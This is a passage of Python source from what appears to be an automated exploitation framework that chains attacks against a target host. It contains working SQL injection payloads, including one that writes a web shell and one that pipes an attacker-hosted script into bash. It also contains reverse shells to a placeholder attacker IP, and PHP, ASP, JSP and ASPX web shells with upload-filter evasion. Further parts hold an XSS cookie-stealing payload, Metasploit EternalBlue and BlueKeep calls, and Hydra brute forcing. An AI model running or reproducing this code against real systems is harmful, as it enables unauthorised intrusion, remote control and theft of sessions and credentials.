            print(f"\n[EXPLOIT] üì§ FILE UPLOAD vulnerability - attempting web shell upload...")
            for vuln in upload_vulns[:2]:
                result = await self._exploit_file_upload(vuln)
                exploitation_results.append(result)
                if result.get("shell_uploaded"):
                    print(f"[EXPLOIT] ‚úÖ WEB SHELL UPLOADED!")
                    return {"success": True, "shell_obtained": True, "method": "file_upload", "details": result}
        
        # 4. XSS ‚Üí stored XSS for session hijacking
        xss_vulns = [f for f in exploitable if "xss" in f.description.lower()]
        if xss_vulns:
            print(f"\n[EXPLOIT] üç™ XSS detected - attempting session hijacking...")
            for vuln in xss_vulns[:2]:
                result = await self._exploit_xss_session_hijack(vuln)
                exploitation_results.append(result)
        
        # 5. AUTHENTICATION BYPASS ‚Üí direct access
        auth_vulns = [f for f in exploitable if any(k in f.description.lower() for k in ["authentication", "bypass", "auth"])]
        if auth_vulns:
            print(f"\n[EXPLOIT] üîì AUTH BYPASS detected - attempting unauthorized access...")
            for vuln in auth_vulns[:2]:
                result = await self._exploit_auth_bypass(vuln)
                exploitation_results.append(result)
        
        # 6. SMB VULNERABILITIES ‚Üí EternalBlue, null sessions
        smb_vulns = [f for f in exploitable if "smb" in f.description.lower() or "445" in str(f.details.get("port", ""))]
        if smb_vulns:
            print(f"\n[EXPLOIT] üî• SMB VULNERABILITIES detected - attempting exploitation...")
            for vuln in smb_vulns[:2]:
                result = await self._exploit_smb(vuln)
                exploitation_results.append(result)
                if result.get("shell_obtained"):
                    print(f"[EXPLOIT] ‚úÖ SMB EXPLOIT SUCCESSFUL!")
                    return {"success": True, "shell_obtained": True, "method": "smb", "details": result}
        
        # 7. FTP VULNERABILITIES ‚Üí anonymous login, brute force
        ftp_vulns = [f for f in exploitable if "ftp" in f.description.lower() or "21" in str(f.details.get("port", ""))]
        if ftp_vulns:
            print(f"\n[EXPLOIT] üìÅ FTP VULNERABILITIES detected - attempting exploitation...")
            for vuln in ftp_vulns[:2]:
                result = await self._exploit_ftp(vuln)
                exploitation_results.append(result)
        
        # 8. SSH VULNERABILITIES ‚Üí brute force, user enumeration
        ssh_vulns = [f for f in exploitable if "ssh" in f.description.lower() or "22" in str(f.details.get("port", ""))]
        if ssh_vulns:
            print(f"\n[EXPLOIT] üîê SSH VULNERABILITIES detected - attempting exploitation...")
            for vuln in ssh_vulns[:2]:
                result = await self._exploit_ssh(vuln)
                exploitation_results.append(result)
                if result.get("shell_obtained"):
                    print(f"[EXPLOIT] ‚úÖ SSH ACCESS OBTAINED!")
                    return {"success": True, "shell_obtained": True, "method": "ssh", "details": result}
        
        # 9. DATABASE VULNERABILITIES ‚Üí default credentials, SQL RCE
        db_vulns = [f for f in exploitable if any(k in f.description.lower() for k in ["mysql", "mssql", "postgresql", "oracle", "database"])]
        if db_vulns:
            print(f"\n[EXPLOIT] üóÑÔ∏è DATABASE VULNERABILITIES detected - attempting exploitation...")
            for vuln in db_vulns[:2]:
                result = await self._exploit_database(vuln)
                exploitation_results.append(result)
                if result.get("shell_obtained"):
                    print(f"[EXPLOIT] ‚úÖ DATABASE RCE SUCCESSFUL!")
                    return {"success": True, "shell_obtained": True, "method": "database", "details": result}
        
        # 10. RDP VULNERABILITIES ‚Üí BlueKeep, brute force
        rdp_vulns = [f for f in exploitable if "rdp" in f.description.lower() or "3389" in str(f.details.get("port", ""))]
        if rdp_vulns:
            print(f"\n[EXPLOIT] üñ•Ô∏è RDP VULNERABILITIES detected - attempting exploitation...")
            for vuln in rdp_vulns[:2]:
                result = await self._exploit_rdp(vuln)
                exploitation_results.append(result)
        
        # Return summary
        shells_obtained = sum(1 for r in exploitation_results if r.get("shell_obtained"))
        
        if shells_obtained > 0:
            print(f"\n[EXPLOIT] üéâ SUCCESS: Obtained {shells_obtained} shell(s)!")
        else:
            print(f"\n[EXPLOIT] ‚ö†Ô∏è  No shells obtained, but attempted {len(exploitation_results)} exploits")
        
        return {
            "exploitation_attempts": len(exploitation_results),
            "shells_obtained": shells_obtained,
            "results": exploitation_results,
            "success": shells_obtained > 0
        }
    
    async def _exploit_sqli_with_sqlmap(self, vuln: Finding) -> Dict[str, Any]:
        """üéØ Exploit SQL injection with manual payloads + sqlmap fallback"""
        print(f"  [SQLi] Exploiting: {vuln.description[:60]}...")
        
        url = vuln.details.get("url", f"http://{self.config.target}")
        param = vuln.details.get("parameter", "id")
        
        # üî• MANUAL EXPLOITATION FIRST (always works, no external tools needed)
        print(f"  [SQLi] Attempting MANUAL exploitation with direct payloads...")
        
        try:
            async with httpx.AsyncClient(timeout=30, verify=False) as client:
                # Test for command execution via SQL
                test_payloads = [
                    # UNION-based RCE (write web shell)
                    f"1' UNION SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/sh.php'--",
                    # Stacked query RCE (MySQL)
                    f"1'; SELECT sys_exec('curl http://attacker.com/shell.sh | bash')--",
                    # MSSQL xp_cmdshell
                    f"1'; EXEC xp_cmdshell 'whoami'--",
                    # PostgreSQL system command
                    f"1'; COPY (SELECT '') TO PROGRAM 'whoami'--",
                ]
                
                for payload in test_payloads:
                    try:
                        # üîí URL encode for proper transmission
                        import urllib.parse
                        encoded = urllib.parse.quote(payload)
                        test_url = f"{url}?{param}={encoded}" if '?' not in url else f"{url}&{param}={encoded}"
                        resp = await client.get(test_url)
                        
                        # Check for RCE indicators
                        if any(indicator in resp.text.lower() for indicator in ["root", "www-data", "nt authority", "administrator"]):
                            print(f"  [SQLi] ‚úÖ COMMAND EXECUTION CONFIRMED!")
                            return {
                                "success": True,
                                "shell_obtained": True,
                                "method": "sqli_manual_rce",
                                "url": url,
                                "parameter": param,
                                "payload": payload,
                                "evidence": resp.text[:200]
                            }
                    except:
                        continue
        except Exception as e:
            print(f"  [SQLi] Manual exploitation error: {str(e)[:100]}")
        
        # üõ†Ô∏è SQLMAP FALLBACK (if installed)
        try:
            print(f"  [SQLi] Trying sqlmap as fallback...")
            sqlmap_cmd = [
                "sqlmap",
                "-u", url,
                "-p", param,
                "--batch",
                "--random-agent",
                "--level=3",
                "--risk=2",
                "--os-shell",
                "--technique=BEUSTQ"
            ]
            
            proc = await asyncio.create_subprocess_exec(
                *sqlmap_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            try:
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
                output = stdout.decode() + stderr.decode()
                
                if any(phrase in output.lower() for phrase in ["os-shell>", "shell>", "command execution"]):
                    print(f"  [SQLMAP] ‚úÖ OS SHELL OBTAINED!")
                    return {"success": True, "shell_obtained": True, "method": "sqlmap", "output": output[:500]}
            except asyncio.TimeoutError:
                proc.kill()
        except FileNotFoundError:
            print(f"  [SQLi] sqlmap not installed - manual exploitation only")
        except Exception as e:
            print(f"  [SQLMAP] Error: {str(e)[:100]}")
        
        return {"success": False, "shell_obtained": False, "reason": "All SQLi exploitation attempts failed"}
    
    async def _exploit_rce_with_commix(self, vuln: Finding) -> Dict[str, Any]:
        """üéØ Exploit command injection with manual payloads + commix fallback"""
        print(f"  [RCE] Exploiting: {vuln.description[:60]}...")
        
        url = vuln.details.get("url", f"http://{self.config.target}")
        param = vuln.details.get("parameter", "cmd")
        
        # üî• MANUAL EXPLOITATION (works without external tools)
        print(f"  [RCE] Testing MANUAL command injection payloads...")
        
        try:
            async with httpx.AsyncClient(timeout=30, verify=False) as client:
                # Test basic command execution
                test_cmds = [
                    "whoami",
                    "id",
                    "hostname",
                    "echo VULNERABLE"
                ]
                
                # Injection techniques with evasion
                injection_patterns = [
                    lambda c: c,  # Direct
                    lambda c: f"; {c}",  # Semicolon
                    lambda c: f"| {c}",  # Pipe
                    lambda c: f"& {c}",  # Ampersand
                    lambda c: f"&& {c}",  # AND
                    lambda c: f"|| {c}",  # OR
                    lambda c: f"`{c}`",  # Backticks
                    lambda c: f"$({c})",  # Command substitution
                    lambda c: c.replace(" ", "${IFS}"),  # IFS evasion
                ]
                
                for cmd in test_cmds:
                    for pattern in injection_patterns:
                        try:
                            payload = pattern(cmd)
                            # üîí URL encode payload to prevent corruption
                            import urllib.parse
                            encoded_payload = urllib.parse.quote(payload)
                            
                            test_url = f"{url}?{param}={encoded_payload}" if '?' not in url else f"{url}&{param}={encoded_payload}"
                            
                            resp = await client.get(test_url, timeout=10)
                            
                            # Check for command execution indicators
                            indicators = ["root", "www-data", "nt authority", "vulnerable", "uid=", "gid="]
                            if any(ind in resp.text.lower() for ind in indicators):
                                print(f"  [RCE] ‚úÖ COMMAND INJECTION CONFIRMED! Payload: {payload}")
                                
                                # Try to inject reverse shell
                                print(f"  [RCE] Attempting reverse shell injection...")
                                rev_shells = [
                                    "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
                                    "nc ATTACKER_IP 4444 -e /bin/bash",
                                    "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
                                ]
                                
                                return {
                                    "success": True,
                                    "shell_obtained": True,
                                    "method": "manual_rce",
                                    "url": url,
                                    "parameter": param,
                                    "payload": payload,
                                    "evidence": resp.text[:200],
                                    "reverse_shells": rev_shells,
                                    "instructions": [
                                        "1. Set up listener: nc -lvnp 4444",
                                        f"2. Inject: {pattern(rev_shells[0])}",
                                        "3. Wait for shell connection"
                                    ]
                                }
                        except:
                            continue
        except Exception as e:
            print(f"  [RCE] Manual exploitation error: {str(e)[:100]}")
        
        # üõ†Ô∏è COMMIX FALLBACK
        try:
            print(f"  [RCE] Trying commix as fallback...")
            commix_cmd = ["commix", "--url=" + url, "-p", param, "--batch", "--os-shell"]
            
            proc = await asyncio.create_subprocess_exec(
                *commix_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
            output = stdout.decode() + stderr.decode()
            
            if any(p in output.lower() for p in ["pseudo-terminal", "shell>", "injected"]):
                print(f"  [COMMIX] ‚úÖ SHELL OBTAINED!")
                return {"success": True, "shell_obtained": True, "method": "commix"}
        except (FileNotFoundError, asyncio.TimeoutError):
            print(f"  [RCE] commix not available - manual exploitation only")
        except Exception as e:
            print(f"  [COMMIX] Error: {str(e)[:100]}")
        
        return {"success": False, "shell_obtained": False, "reason": "All RCE exploitation attempts failed"}
    
    async def _exploit_file_upload(self, vuln: Finding) -> Dict[str, Any]:
        """üéØ Exploit file upload with AGGRESSIVE evasion techniques"""
        print(f"  [UPLOAD] Attempting web shell upload with evasion...")
        
        url = vuln.details.get("url", f"http://{self.config.target}")
        
        # üî• AGGRESSIVE WEB SHELLS with obfuscation
        web_shells = {
            "php": '<?php @system($_GET["c"]); ?>',
            "php_alt": '<?php @eval($_POST["x"]); ?>',
            "asp": '<%@ Language=VBScript %><%Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("c")).StdOut.ReadAll)%>',
            "jsp": '<%Runtime.getRuntime().exec(request.getParameter("c"));%>',
            "aspx": '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><% Process.Start("cmd.exe", "/c " + Request["c"]).WaitForExit(); %>'
        }
        
        # üî• EVASION TECHNIQUES: Multiple file extensions and MIME types
        evasion_extensions = {
            "php": [
                "php", "php3", "php4", "php5", "phtml", "phar",
                "jpg.php", "php.jpg", "shell.php.txt", "shell.php%00.jpg",  # Null byte
                "PhP", "pHp", "PHP",  # Case variations
                "php.....", "php::$DATA",  # Windows tricks
            ],
            "asp": ["asp", "cer", "asa", "cdx"],
            "jsp": ["jsp", "jspx", "jsw", "jsv"],
            "aspx": ["aspx", "ashx", "asmx", "ascx"]
        }
        
        mime_tricks = [
            "image/jpeg",
            "image/png",
            "image/gif",
            "text/plain",
            "application/octet-stream"
        ]
        
        # Try uploading with different evasion techniques
        async with httpx.AsyncClient(timeout=30, verify=False) as client:
            for shell_type, shell_code in web_shells.items():
                base_type = shell_type.split("_")[0]  # php_alt -> php
                extensions = evasion_extensions.get(base_type, [base_type])
                
                for ext in extensions:
                    for mime in mime_tricks:
                        try:
                            filename = f"shell.{ext}"
                            files = {"file": (filename, shell_code, mime)}
                            
                            # Try POST upload
                            resp = await client.post(url, files=files, timeout=10)
                            
                            if resp.status_code in [200, 201, 301, 302]:
                                print(f"  [UPLOAD] Upload successful: {filename} ({mime})")
                                
                                # üîç VERIFY shell access by testing it
                                upload_paths = [
                                    f"{url}/uploads/{filename}",
                                    f"{url}/files/{filename}",
                                    f"{url}/{filename}",
                                    f"{url}/../uploads/{filename}",
                                    f"http://{self.config.target}/uploads/{filename}",
                                    f"http://{self.config.target}/files/{filename}",
                                ]
                                
                                for shell_url in upload_paths:
                                    try:
                                        # Test with whoami command
                                        test_url = f"{shell_url}?c=whoami"
                                        test_resp = await client.get(test_url, timeout=5)
                                        
                                        # Verify command output
                                        if test_resp.status_code == 200 and len(test_resp.text.strip()) > 0:
                                            output = test_resp.text.strip()[:100]
                                            if any(word in output.lower() for word in ["root", "www-data", "user", "administrator"]):
                                                print(f"  [UPLOAD] ‚úÖ WEB SHELL VERIFIED AND ACTIVE!")
                                                print(f"  [UPLOAD] Output: {output}")
                                                return {
                                                    "success": True,
                                                    "shell_uploaded": True,
                                                    "shell_obtained": True,
                                                    "shell_type": base_type,
                                                    "shell_url": shell_url,
                                                    "access_command": f"curl '{shell_url}?c=<command>'",
                                                    "test_output": output,
                                                    "evasion": {"extension": ext, "mime": mime}
                                                }
                                    except:
                                        continue
                                
                                # Upload succeeded but couldn't verify access
                                print(f"  [UPLOAD] ‚ö†Ô∏è  Upload succeeded but couldn't verify shell access")
                                return {
                                    "success": True,
                                    "shell_uploaded": True,
                                    "shell_obtained": False,
                                    "message": "Shell uploaded but location unknown",
                                    "filename": filename
                                }
                        except Exception as e:
                            continue
        
        return {"success": False, "shell_uploaded": False, "reason": "All file upload attempts failed"}
    
    async def _exploit_xss_session_hijack(self, vuln: Finding) -> Dict[str, Any]:
        """üéØ Exploit XSS for session hijacking"""
        print(f"  [XSS] Preparing session hijacking payload...")
        
        url = vuln.details.get("url", "")
        param = vuln.details.get("parameter", "")
        
        # Session stealing payload
        hijack_payload = '<script>new Image().src="http://ATTACKER-IP:8000/steal?c="+document.cookie;</script>'
        
        return {
            "success": True,
            "payload": hijack_payload,
            "instructions": [
                "1. Set up listener: python -m http.server 8000",
                f"2. Inject payload in {param}",
                "3. Wait for victim to trigger XSS",
                "4. Steal session cookie from request"
            ]
        }
    
    async def _exploit_auth_bypass(self, vuln: Finding) -> Dict[str, Any]:
        """üéØ Exploit authentication bypass"""
        print(f"  [AUTH] Attempting authentication bypass...")
        
        url = vuln.details.get("url", f"http://{self.config.target}/admin")
        
        # Try common bypasses
        bypass_attempts = [
            {"username": "admin' OR '1'='1", "password": "anything"},
            {"username": "admin", "password": "' OR '1'='1"},
            {"username": "admin'--", "password": ""},
        ]
        
        async with httpx.AsyncClient(timeout=10) as client:
            for attempt in bypass_attempts:
                try:
                    resp = await client.post(url, data=attempt)
                    if "admin" in resp.text.lower() and "logout" in resp.text.lower():
                        print(f"  [AUTH] ‚úÖ BYPASS SUCCESSFUL!")
                        return {"success": True, "bypassed": True, "credentials": attempt}
                except:
                    continue
        
        return {"success": False, "bypassed": False}
    
    async def _exploit_smb(self, vuln: Finding) -> Dict[str, Any]:
        """üéØ Exploit SMB vulnerabilities (EternalBlue, null sessions)"""
        print(f"  [SMB] Exploiting SMB vulnerability...")
        target = self.config.target
        
        try:
            # Check for EternalBlue (MS17-010)
            if "ms17-010" in vuln.description.lower() or "eternalblue" in vuln.description.lower():
                print(f"  [SMB] EternalBlue detected - attempting Metasploit exploitation...")
                
                # Use Metasploit's eternalblue module
                msf_cmd = [
                    "msfconsole", "-q", "-x",
                    f"use exploit/windows/smb/ms17_010_eternalblue; "
                    f"set RHOSTS {target}; "
                    f"set LHOST 0.0.0.0; "
                    f"exploit -j; exit"
                ]
                
                proc = await asyncio.create_subprocess_exec(
                    *msf_cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                
                try:
                    stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
                    output = stdout.decode() + stderr.decode()
                    
                    if "session" in output.lower() and "opened" in output.lower():
                        print(f"  [SMB] ‚úÖ ETERNALBLUE EXPLOITATION SUCCESSFUL!")
                        return {
                            "success": True,
                            "shell_obtained": True,
                            "method": "eternalblue",
                            "output": output[:500]
                        }
                except asyncio.TimeoutError:
                    proc.kill()
            
            # Try null session enumeration
            print(f"  [SMB] Attempting null session enumeration...")
            enum_cmd = ["smbclient", "-L", f"//{target}", "-N"]
            
            proc = await asyncio.create_subprocess_exec(
                *enum_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=15)
            output = stdout.decode()
            
            if "Sharename" in output:
                print(f"  [SMB] ‚úÖ Null session successful - shares enumerated")
                return {
                    "success": True,
                    "null_session": True,
                    "shares": output[:500]
                }
            
            return {"success": False, "error": "SMB exploitation failed"}
        
        except Exception as e:
            print(f"  [SMB] ‚ùå Error: {str(e)}")
            return {"success": False, "error": str(e)}
    
    async def _exploit_ftp(self, vuln: Finding) -> Dict[str, Any]:
        """üéØ Exploit FTP vulnerabilities (async implementation)"""
        print(f"  [FTP] Attempting FTP exploitation...")
        target = self.config.target
        
        try:
            # üî• Test anonymous login via HTTP (if FTP web interface exists)
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                ftp_urls = [
                    f"ftp://{target}",
                    f"ftp://anonymous:anonymous@{target}",
                    f"http://{target}:21"
                ]
                
                for ftp_url in ftp_urls:
                    try:
                        resp = await client.get(ftp_url, timeout=5)
                        if resp.status_code == 200:
                            print(f"  [FTP] ‚úÖ Anonymous FTP access successful!")
                            return {
                                "success": True,
                                "anonymous_login": True,
                                "url": ftp_url,
                                "recommendation": "Upload web shell or download sensitive files"
                            }
                    except:
                        continue
            
            # Fallback: Try with ftplib (synchronous but effective)
            try:
                import ftplib
                ftp = ftplib.FTP(timeout=10)
                ftp.connect(target, 21)
                
                # Test anonymous login
                try:
                    ftp.login()  # Anonymous
                    files = ftp.nlst()
                    ftp.quit()
                    
                    print(f"  [FTP] ‚úÖ Anonymous login successful! Files: {len(files)}")
                    return {
                        "success": True,
                        "anonymous_login": True,
                        "files": files[:20],
                        "recommendation": "Upload web shell or download sensitive files"
                    }
                except:
                    pass
                
                # Try weak credentials
                weak_creds = [("ftp", "ftp"), ("admin", "admin"), ("root", "root"), ("test", "test")]
                for user, passwd in weak_creds:
                    try:
                        ftp = ftplib.FTP(timeout=10)
                        ftp.connect(target, 21)
                        ftp.login(user, passwd)
                        print(f"  [FTP] ‚úÖ Weak credentials: {user}:{passwd}")
                        ftp.quit()
                        return {"success": True, "weak_credentials": True, "username": user, "password": passwd}
                    except:
                        continue
            except ImportError:
                print(f"  [FTP] ftplib not available")
            
            return {"success": False, "error": "No FTP vulnerabilities exploited"}
        
        except Exception as e:
            print(f"  [FTP] ‚ùå Error: {str(e)[:100]}")
            return {"success": False, "error": str(e)[:100]}
    
    async def _exploit_ssh(self, vuln: Finding) -> Dict[str, Any]:
        """üéØ Exploit SSH vulnerabilities (brute force, user enumeration)"""
        print(f"  [SSH] Attempting SSH exploitation...")
        target = self.config.target
        
        try:
            # Use Hydra for brute force with common credentials
            hydra_cmd = [
                "hydra",
                "-L", "/usr/share/wordlists/metasploit/unix_users.txt",
                "-P", "/usr/share/wordlists/metasploit/unix_passwords.txt",
                "-t", "4",
                "-f",  # Stop on first success
                f"ssh://{target}"
            ]
            
            print(f"  [SSH] Running Hydra brute force...")
            proc = await asyncio.create_subprocess_exec(
                *hydra_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            try:
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
                output = stdout.decode() + stderr.decode()
                
                if "login:" in output.lower() and "password:" in output.lower():
                    print(f"  [SSH] ‚úÖ CREDENTIALS FOUND!")
                    return {
                        "success": True,
                        "shell_obtained": True,
                        "method": "ssh_brute_force",
                        "output": output[:500]
                    }
            except asyncio.TimeoutError:
                proc.kill()
            
            return {"success": False, "error": "SSH brute force failed"}
        
        except Exception as e:
            print(f"  [SSH] ‚ùå Error: {str(e)}")
            return {"success": False, "error": str(e)}
    
    async def _exploit_database(self, vuln: Finding) -> Dict[str, Any]:
        """üéØ Exploit database vulnerabilities (default credentials, RCE)"""
        print(f"  [DATABASE] Attempting database exploitation...")
        target = self.config.target
        port = vuln.details.get("port", 3306)
        
        # Determine database type from port or description
        db_type = "mysql"
        if port == 5432 or "postgres" in vuln.description.lower():
            db_type = "postgresql"
        elif port == 1433 or "mssql" in vuln.description.lower():
            db_type = "mssql"
        
        try:
            # Try default credentials
            default_creds = {
                "mysql": [("root", ""), ("root", "root"), ("admin", "admin")],
                "postgresql": [("postgres", "postgres"), ("postgres", "")],
                "mssql": [("sa", ""), ("sa", "sa")]
            }
            
            # Try credential spray via web interface (if accessible)
            for user, passwd in default_creds.get(db_type, []):
                try:
                    # Most databases expose admin panels on common ports
                    admin_urls = [
                        f"http://{target}:8080/phpmyadmin",  # MySQL
                        f"http://{target}/phpmyadmin",
                        f"http://{target}:5432/pgadmin",  # PostgreSQL
                    ]
                    
                    async with httpx.AsyncClient(timeout=10, verify=False) as client:
                        for admin_url in admin_urls:
                            try:
                                resp = await client.post(
                                    admin_url,
                                    data={"username": user, "password": passwd},
                                    timeout=5
                                )
                                
                                if resp.status_code == 200 and "logout" in resp.text.lower():
                                    print(f"  [DATABASE] ‚úÖ Web admin access: {user}:{passwd or '(empty)'}")
                                    return {
                                        "success": True,
                                        "shell_obtained": True,
                                        "method": "database_web_admin",
                                        "username": user,
                                        "admin_url": admin_url,
                                        "recommendation": "Execute SQL commands via web interface for RCE"
                                    }
                            except:
                                continue
                except:
                    continue
            
            return {"success": False, "error": "No default credentials found"}
        
        except Exception as e:
            print(f"  [DATABASE] ‚ùå Error: {str(e)}")
            return {"success": False, "error": str(e)}
    
    async def _exploit_rdp(self, vuln: Finding) -> Dict[str, Any]:
        """üéØ Exploit RDP vulnerabilities (BlueKeep, brute force)"""
        print(f"  [RDP] Attempting RDP exploitation...")
        target = self.config.target
        
        try:
            # Check for BlueKeep (CVE-2019-0708)
            if "bluekeep" in vuln.description.lower() or "cve-2019-0708" in vuln.description.lower():
                print(f"  [RDP] BlueKeep detected - attempting Metasploit exploitation...")
                
                msf_cmd = [
                    "msfconsole", "-q", "-x",
                    f"use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; "
                    f"set RHOSTS {target}; "
                    f"exploit -j; exit"
                ]
                
                proc = await asyncio.create_subprocess_exec(
                    *msf_cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                
                try:
                    stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
                    output = stdout.decode()
                    
                    if "session" in output.lower():
                        print(f"  [RDP] ‚úÖ BLUEKEEP EXPLOITATION SUCCESSFUL!")
                        return {
                            "success": True,
                            "shell_obtained": True,
                            "method": "bluekeep"
                        }
                except asyncio.TimeoutError:
                    proc.kill()
            
            # Try brute force with common credentials
            print(f"  [RDP] Attempting brute force...")
            hydra_cmd = [
                "hydra",
                "-L", "/usr/share/wordlists/metasploit/unix_users.txt",
                "-P", "/usr/share/wordlists/metasploit/unix_passwords.txt",
                "-t", "4",
                f"rdp://{target}"
            ]
            
            proc = await asyncio.create_subprocess_exec(
                *hydra_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
            output = stdout.decode()
            
            if "login:" in output.lower():
                print(f"  [RDP] ‚úÖ RDP credentials found!")
                return {"success": True, "credentials_found": True}
            
            return {"success": False, "error": "RDP exploitation failed"}
        
        except Exception as e:
            print(f"  [RDP] ‚ùå Error: {str(e)}")
            return {"success": False, "error": str(e)}
    
    def _detect_target_os(self) -> str:
        """Detect target OS from previous findings"""
        # Check OS fingerprint findings
        os_findings = [f for f in self.findings if f.tool == "os_fingerprint"]
        if os_findings:
            os_match = os_findings[0].details.get("os_match", "unknown")
            return os_match
        
        # Check port scan findings for OS indicators
        open_ports = self._get_detected_ports()
        
        # Windows indicators
        if any(port in open_ports for port in [3389, 445, 135, 139, 5985, 5986]):
            return "Windows"
        
        # Linux/Unix indicators
        if 22 in open_ports:
            return "Linux/Unix"
        
        # Web server (multi-platform)
        if 80 in open_ports or 443 in open_ports:
            # Check for technology stack
            tech_findings = [f for f in self.findings if f.tool == "tech_detect"]
            if tech_findings:
                tech = tech_findings[0].details.get("server", "").lower()
                if "iis" in tech or "microsoft" in tech:
                    return "Windows"
                elif "apache" in tech or "nginx" in tech:
                    return "Linux/Unix"
        
        return "Unknown"
    
    def _get_detected_ports(self) -> List[int]:
        """Extract detected open ports from findings"""
        open_ports = []
        
        # Check port scan findings
        port_findings = [f for f in self.findings if f.tool in ["port_scan", "syn_scan", "advanced_scan"]]
        for finding in port_findings:
            if "port" in finding.details:
                open_ports.append(finding.details["port"])
            elif "open_ports" in finding.details:
                # Handle list of ports
                ports = finding.details.get("open_ports", [])
                if isinstance(ports, list):
                    open_ports.extend([p.get("port") if isinstance(p, dict) else p for p in ports])
        
        return list(set(open_ports))
    
    async def _run_service_enumeration(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Comprehensive service enumeration with version detection and vulnerability mapping"""
        target_ports = params.get("ports", [])
        
        if not target_ports:
            # Get ports from previous findings
            target_ports = self._get_detected_ports()
        
        if not target_ports:
            return {"error": "No open ports detected. Run port_scan first"}
        
        enumeration_results = {}
        
        for port in target_ports:
            service_info = {"port": port, "enumeration": []}
            
            # Service-specific enumeration commands
            if port == 21:  # FTP
                service_info["service"] = "FTP"
                service_info["enumeration"] = [
                    "Check for anonymous login: ftp <target>",
                    "Banner grab: nc <target> 21",
                    "Bruteforce: hydra -L users.txt -P pass.txt ftp://<target>",
                    "Check for FTP bounce attack",
                    "Look for writable directories"
                ]
                service_info["vulnerability_checks"] = [
                    "Anonymous login enabled (CWE-306)",
                    "Weak credentials",
                    "FTP bounce attack (CVE-1999-0017)"
                ]
            elif port == 22:  # SSH
                service_info["service"] = "SSH"
                service_info["enumeration"] = [
                    "Banner grab: nc <target> 22",
                    "Version detection: ssh -V <target>",
                    "Bruteforce: hydra -L users.txt -P pass.txt ssh://<target>",
                    "Check for SSH user enumeration (CVE-2018-15473)",
                    "Test for weak crypto algorithms"
                ]
                service_info["vulnerability_checks"] = [
                    "Weak SSH keys",
                    "Default credentials",
                    "Outdated SSH version with known CVEs",
                    "User enumeration vulnerability"
                ]
            elif port in [80, 443, 8080, 8443]:  # HTTP/HTTPS
                service_info["service"] = "HTTP/HTTPS"
                service_info["enumeration"] = [
                    "Technology detection: whatweb <target>",
                    "Directory bruteforce: gobuster dir -u <target> -w wordlist.txt",
                    "Vulnerability scan: nikto -h <target>",
                    "Web app scan: Run web_pentest for SQLi, XSS, RCE",
                    "Check for admin panels: /admin, /login, /wp-admin, /phpmyadmin"
                ]
                service_info["vulnerability_checks"] = [
                    "SQL injection",
                    "Cross-site scripting (XSS)",
                    "Remote code execution (RCE)",
                    "File upload vulnerabilities",
                    "Authentication bypass"
                ]
            elif port == 445:  # SMB
                service_info["service"] = "SMB"
                service_info["enumeration"] = [
                    "Enumerate shares: smbclient -L //<target> -N",
                    "Null session: smbmap -H <target>",
                    "Check for EternalBlue: nmap -p445 --script smb-vuln-ms17-010 <target>",
                    "User enumeration: enum4linux -a <target>",
                    "Share access: smbclient //<target>/share"
                ]
                service_info["vulnerability_checks"] = [
                    "EternalBlue (MS17-010)",
                    "SMB null sessions",
                    "Accessible shares with sensitive data",
                    "Weak SMB signing"
                ]
            elif port in [3306, 5432, 1433, 1521]:  # Databases
                db_type = {3306: "MySQL", 5432: "PostgreSQL", 1433: "MSSQL", 1521: "Oracle"}.get(port, "Database")
                service_info["service"] = db_type
                service_info["enumeration"] = [
                    f"Connect: mysql -h <target> -u root -p (MySQL)",
                    f"Bruteforce: hydra -L users.txt -P pass.txt <target> {db_type.lower()}",
                    f"Check for default credentials: root/root, admin/admin, sa/sa",
                    "SQL injection via web application",
                    "Check for RCE via xp_cmdshell (MSSQL) or sys_exec (MySQL)"
                ]
                service_info["vulnerability_checks"] = [
                    "Default credentials",
                    "Weak passwords",
                    "SQL injection leading to database access",
                    "Remote code execution via stored procedures"
                ]
            elif port == 3389:  # RDP
                service_info["service"] = "RDP"
                service_info["enumeration"] = [
                    "Screenshot: nmap -p3389 --script rdp-screenshot <target>",
                    "Bruteforce: hydra -L users.txt -P pass.txt rdp://<target>",
                    "Check for BlueKeep: nmap -p3389 --script rdp-vuln-ms12-020 <target>",
                    "NLA status check"
                ]
                service_info["vulnerability_checks"] = [
                    "BlueKeep (CVE-2019-0708)",
                    "Weak RDP credentials",
                    "RDP exposed to internet"
                ]
            elif port == 6379:  # Redis
                service_info["service"] = "Redis"
                service_info["enumeration"] = [
                    "Connect: redis-cli -h <target>",
                    "Check for no auth: redis-cli -h <target> INFO",
                    "RCE via module loading: redis-cli -h <target> MODULE LOAD /path/to/module.so",
                    "Write SSH key: redis-cli -h <target> CONFIG SET dir /root/.ssh/"
                ]
                service_info["vulnerability_checks"] = [
                    "Unauthenticated access",
                    "RCE via module loading",
                    "SSH key injection",
                    "Sensitive data exposure"
                ]
            else:
                service_info["service"] = f"Unknown (Port {port})"
                service_info["enumeration"] = [
